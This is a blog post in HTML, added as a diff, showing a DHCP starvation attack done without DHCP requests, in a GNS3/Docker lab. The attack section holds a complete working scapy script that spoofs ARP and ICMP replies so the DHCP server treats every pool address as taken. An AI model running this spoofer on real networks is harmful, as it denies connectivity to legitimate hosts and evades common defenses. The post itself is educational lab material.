@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DHCP starvation attack without making any DHCP requests — Manoj Vignesh K M</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,300;0,400;0,700;1,400&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/blog/assets/css/style.css" />
+</head>
+<body>
+  <header class="blog-header">
+    <a href="/" class="back-link">← Portfolio</a>
+    <a href="/blog/" class="blog-title">Manoj's Blog</a>
+  </header>
+  <main class="blog-content">
+    <article class="post">
+  <header class="post-header">
+    <h1>DHCP starvation attack without making any DHCP requests</h1>
+    <time datetime="2020-08-19T23:30:00-07:00">
+      August 19, 2020
+    </time>
+    
+    <div class="post-tags">
+      <span class="tag">networking</span><span class="tag">security</span><span class="tag">dhcp</span>
+    </div>
+    
+  </header>
+
+  <div class="post-layout">
+    <aside class="post-toc" id="toc">
+      <p class="toc-title">Contents</p>
+      <nav id="toc-nav"></nav>
+    </aside>
+
+    <div class="post-body" id="post-body">
+      <blockquote>
+  <p>Most defense systems filter out repeated DHCP requests. What if you could perform DHCP starvation without sending a DCHP request?</p>
+</blockquote>
+
+<p>DHCP, Dynamic host configuration protocol, is a network protocol that offers an IP address and other required details that include gateway IP, DNS IP to a host that enters a network. The DHCP protocol as defined in <a href="https://tools.ietf.org/html/rfc2131">RFC2131</a> involves 4 transactions back and forth between the client and server, namely:</p>
+
+<ul>
+  <li>DHCP Discover — broadcast from the client</li>
+  <li>DHCP Offer — broadcast from the server</li>
+  <li>DHCP Request — unicast from client</li>
+  <li>DHCP ACK — unicast from server</li>
+</ul>
+
+<p><a href="https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol">Wikipedia explains the DHCP protocol amazingly</a>!</p>
+
+<h2 id="dhcp-attacks">DHCP Attacks</h2>
+
+<p>Similar to the ARP protocol, due to its inability to authenticate users who enter the network, there have been multiple types of attacks on the protocol. Here are some of the well-known DHCP attacks:</p>
+
+<ul>
+  <li><strong>DHCP Snooping</strong>: In this attack, a malicious client acts as a DHCP server and services clients as they enter the network. The malicious client could send custom gateway and DNS server IPs to establish itself as a man-in-the-middle and perform DNS poisoning.</li>
+  <li><strong>DHCP Starvation</strong>: In this attack, a malicious client sends multiple DHCP requests and holds all the IP address present in the DHCP pool, thereby not allowing any new host to join the network. Denial of Service.</li>
+</ul>
+
+<h2 id="dhcp-starvationprotocol-dissection">DHCP starvation — Protocol dissection</h2>
+
+<p>The following image shows a screenshot of the packet capture during a DHCP transaction.</p>
+
+<p><img src="/blog/assets/res/dhcp_starvation_attack_without_making_any_dhcp_requests/packet_capture_of_dhcp_transactions.png" alt="packet capture of DHCP transactions" />
+<em>packet capture of DHCP transactions</em></p>
+
+<h3 id="what-is-arp-doinghere">What is ARP doing here?</h3>
+
+<p>The DHCP server broadcasts an ARP request followed by an ICMP request to ensure that the IP address that it is going to DHCP Offer is indeed available. Eureka?</p>
+
+<p>Why does one need to make a DHCP request to starve the DHCP pool? Most of the defensive systems look for repeated DHCP requests from the same MAC address. What if I replied to DHCP’s ARP request and made DHCP believe that the IP address is already in use?</p>
+
+<p>Thus, in this article let’s see how one can carry out ARP spoofing to impersonate a client that does not exist to make the DHCP server believe that the IP address that is picked from the pool to make DHCP Offer is already held by another client.</p>
+
+<h2 id="the-experiment">The Experiment</h2>
+
+<p>In this experiment, let us use <a href="https://www.gns3.com/">GNS3</a>, a network simulation tool, and <a href="https://www.docker.com/">Docker</a> containers as a DHCP server, a malicious client, and a benign client.</p>
+
+<h3 id="dhcp-server">DHCP Server</h3>
+
+<p>Let us create a DHCP server from scratch. Login to the GNS3 VM (this is where containers spin up). ISC DHCP server software is used to configure and run a DHCP server in ubuntu container [<a href="https://www.tecmint.com/install-dhcp-server-in-ubuntu-debian/">Reference</a>].</p>
+
+<ul>
+  <li>Create a Dockerfile with the following contents:</li>
+</ul>
+
+<div class="language-dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> ubuntu</span>
+<span class="k">RUN </span>apt-get update <span class="o">&amp;&amp;</span> apt-get <span class="nb">install</span> <span class="nt">-y</span> vim net-tools isc-dhcp-server
+</code></pre></div></div>
+
+<ul>
+  <li>Build the docker image by running <code class="language-plaintext highlighter-rouge">docker build -t dhcp-server .</code>.</li>
+  <li>Then, import the built docker image as a GNS3 appliance. <a href="https://docs.gns3.com/docs/emulators/docker-support-in-gns3/">how</a>?</li>
+  <li>Drag in the created appliance into the GNS3 workspace.</li>
+  <li>Start the server by right-clicking and selecting “start”. Double-click the node to get a console.</li>
+  <li>Navigate to <code class="language-plaintext highlighter-rouge">/etc/dhcp</code> and append the following content to the <code class="language-plaintext highlighter-rouge">dhcpd.conf</code> file.</li>
+</ul>
+
+<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">subnet</span> <span class="m">192</span>.<span class="m">168</span>.<span class="m">1</span>.<span class="m">0</span> <span class="n">netmask</span> <span class="m">255</span>.<span class="m">255</span>.<span class="m">255</span>.<span class="m">0</span> {
+ <span class="n">range</span> <span class="m">192</span>.<span class="m">168</span>.<span class="m">1</span>.<span class="m">150</span> <span class="m">192</span>.<span class="m">168</span>.<span class="m">1</span>.<span class="m">160</span>;
+ <span class="n">option</span> <span class="n">routers</span> <span class="m">192</span>.<span class="m">168</span>.<span class="m">1</span>.<span class="m">1</span>;
+ <span class="n">option</span> <span class="n">domain</span>-<span class="n">name</span>-<span class="n">servers</span> <span class="m">192</span>.<span class="m">168</span>.<span class="m">1</span>.<span class="m">1</span>;
+ <span class="n">option</span> <span class="n">domain</span>-<span class="n">name</span> <span class="s2">"example.org"</span>;
+}
+</code></pre></div></div>
+
+<ul>
+  <li>Create an empty file, for the DHCP server to hold the leased IP addresses, by running the command:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch</span> /var/lib/dhcp/dhcpd.lease
+</code></pre></div></div>
+
+<ul>
+  <li>Further, assign an IP address to the DHCP server by running the following command:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig eth0 192.168.1.1/24
+</code></pre></div></div>
+
+<ul>
+  <li>Finally, startup the DHCP server by running the command <code class="language-plaintext highlighter-rouge">dhcpd</code> .</li>
+</ul>
+
+<h3 id="malicious-client-and-benignclient">Malicious Client and Benign Client</h3>
+
+<p>The malicious client is a Linux machine with <a href="https://scapy.net/">scapy</a> installed, <code class="language-plaintext highlighter-rouge">[ehlers/scapy](https://hub.docker.com/r/ehlers/scapy)</code> . Import this docker image to GNS3 as an appliance too, and drag in an instance of this into the workspace. Right-click on the malicious client instance on the workspace and <code class="language-plaintext highlighter-rouge">edit config</code> to uncomment the lines under DHCP config. This configures the instance to obtain an IP address from the DHCP server.</p>
+
+<p><img src="/blog/assets/res/dhcp_starvation_attack_without_making_any_dhcp_requests/dhcp_client_enabled.png" alt="DHCP client enabled" />
+<em>DHCP client enabled</em></p>
+
+<p>Before we start up the malicious client, drag in a GNS3 default switch to the workspace. Then, connect the malicious client and the DHCP server to the switch. Drag in another instance of <code class="language-plaintext highlighter-rouge">ehlers/scapy</code> which plays the role of a benign client. Edit the configuration to make it look similar to the malicious client. After the setup, the network looks similar to the following image:</p>
+
+<p><img src="/blog/assets/res/dhcp_starvation_attack_without_making_any_dhcp_requests/network_topology.png" alt="Network topology" />
+<em>Network topology</em></p>
+
+<p>It’s time!</p>
+
+<p>Right-click on the link between the DHCP server and the switch to begin packet capture. Then, startup the malicious client.</p>
+
+<p>Observe that the DHCP transactions happen and the malicious client successfully gets an IP address.</p>
+
+<h3 id="attack">Attack</h3>
+
+<p>Get a console by double-clicking on the malicious client and create a <code class="language-plaintext highlighter-rouge">arp_spoof.py</code> python file with the following content.</p>
+
+<noscript><pre>import sys
+
+from threading import Thread
+from scapy.all import *
+
+INTERFACE = &quot;eth0&quot;
+MY_MAC_ADDRESS = get_if_hwaddr(INTERFACE)
+MY_IP_ADDRESS = get_if_addr(INTERFACE)
+
+&#39;&#39;&#39;
+Approach 2: Using AnsweringMachine
+$ python3 arp_spoof.py
+&#39;&#39;&#39;
+
+class ARPSpoofer(AnsweringMachine):
+    def is_request(self, request):
+        return request.haslayer(&#39;ARP&#39;) and request[ARP].op == 1 and request[ARP].pdst != MY_IP_ADDRESS
+    
+    def make_reply(self, request):
+        response = Ether()/ARP()
+
+        response[Ether].dst = request[Ether].src
+        response[Ether].src = MY_MAC_ADDRESS
+
+        response[ARP].op = 2
+        response[ARP].hwsrc = MY_MAC_ADDRESS
+        response[ARP].hwdst = request[ARP].hwsrc
+        response[ARP].psrc = request[ARP].pdst
+        response[ARP].pdst = request[ARP].psrc
+
+        return response[ARP]
+
+class PingResponder(AnsweringMachine):
+    def is_request(self, request):
+        return request.haslayer(&#39;ICMP&#39;) and request[ICMP].type == 8 and request[IP].dst != MY_IP_ADDRESS
+    
+    def make_reply(self, request):
+        response = Ether()/IP()/ICMP()/&quot;&quot;
+
+        response[Ether].dst = request[Ether].src
+        response[Ether].src = MY_MAC_ADDRESS
+
+        response[IP].src = request[IP].dst
+        response[IP].dst = request[IP].src
+
+        response[ICMP].type = 0
+        response[ICMP].id = request[ICMP].id
+        response[ICMP].seq = request[ICMP].seq
+
+        response[Raw].load = request[Raw].load
+
+        return response[IP]
+
+arp_spoofer = Thread(target=ARPSpoofer())
+arp_spoofer.start()
+
+ping_responder = Thread(target=PingResponder())
+ping_responder.start()
+
+arp_spoofer.join()
+ping_responder.join()</pre></noscript>
+<script src="https://gist.github.com/kmmanoj/b4d3a8e62ad3963e061c1cc2d0e9fc7c.js"> </script>
+
+<p>The code performs ARP spoofing and is explained in <a href="https://medium.com/@kmm4n0j/arp-spoofing-using-scapy-92a330cce64b">one of my older blogs</a> in detail. In brief, each thread listens to a specific type of request i.e. ARP request and ICMP request and responds to them accordingly. As the ARP requests are replied by the malicious node, the switch believes that the MAC address associated with the IP address in question (ARP protocol) is that of the malicious node’s MAC address. That is how ARP spoofing is achieved.</p>
+
+<p>Run the python code by hitting the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python arp_spoof.py
+</code></pre></div></div>
+
+<p>Now, start up the benign client and observe!</p>
+
+<h2 id="observation">Observation</h2>
+
+<p>Double click on the benign client to get a console. Run, <code class="language-plaintext highlighter-rouge">ifconfig</code> and observe that the benign client hasn’t received an IP address yet!</p>
+
+<h3 id="why">Why?</h3>
+
+<p>Observe the running packet capture.</p>
+
+<p><img src="/blog/assets/res/dhcp_starvation_attack_without_making_any_dhcp_requests/dhcp_starvation_by_arp_and_ip_spoofing.png" alt="DHCP starvation by ARP and IP spoofing" />
+<em>DHCP starvation by ARP and IP spoofing</em></p>
+
+<p>The benign client continuously makes DHCP Discover, while the DHCP server is busy crafting the DHCP Offer. The DHCP server is not able to find an available IP address in it’s DHCP pool. It finds an IP address from the DHCP pool, checks if it already taken by another host by making an ARP request followed by an ICMP request, and that is where the malicious client jumps in to respond to those messages. Thus, the DHCP server concludes that the IP address is already taken and skips to the following available IP address in the pool. The process repeats infinitely, and the benign client stays without an IP address.
+Hence, a DHCP starvation attack was carried out!</p>
+
+<blockquote>
+  <p>I have them all, but I can’t use any! — DHCP Server</p>
+</blockquote>
+
+    </div>
+  </div>
+</article>
+
+<script>
+(function () {
+  var headings = document.querySelectorAll('#post-body h2, #post-body h3, #post-body h4');
+  if (headings.length === 0) {
+    document.getElementById('toc').style.display = 'none';
+    return;
+  }
+
+  var nav = document.getElementById('toc-nav');
+  var ul = document.createElement('ul');
+  ul.className = 'toc-list';
+
+  headings.forEach(function (h, i) {
+    if (!h.id) h.id = 'heading-' + i;
+
+    var li = document.createElement('li');
+    li.className = 'toc-item toc-' + h.tagName.toLowerCase();
+
+    var a = document.createElement('a');
+    a.href = '#' + h.id;
+    a.textContent = h.textContent;
+    a.className = 'toc-link';
+
+    li.appendChild(a);
+    ul.appendChild(li);
+  });
+
+  nav.appendChild(ul);
+
+  // Move leading blockquote to header as subtitle
+  var body = document.getElementById('post-body');
+  var first = body.firstElementChild;
+  if (first && first.tagName === 'BLOCKQUOTE') {
+    var subtitle = document.createElement('p');
+    subtitle.className = 'post-subtitle';
+    subtitle.textContent = first.textContent.trim();
+    document.querySelector('.post-header').appendChild(subtitle);
+    first.remove();
+  }
+
+  // Highlight active heading on scroll
+  var links = nav.querySelectorAll('.toc-link');
+  var observer = new IntersectionObserver(function (entries) {
+    entries.forEach(function (entry) {
+      if (entry.isIntersecting) {
+        links.forEach(function (l) { l.classList.remove('active'); });
+        var active = nav.querySelector('a[href="#' + entry.target.id + '"]');
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '0px 0px -80% 0px' });
+
+  headings.forEach(function (h) { observer.observe(h); });
+}());
+</script>
+
+  </main>
+  <footer class="blog-footer">
+    <p>Manoj Vignesh K M · <a href="/">Portfolio</a></p>
+  </footer>
+</body>
+</html>
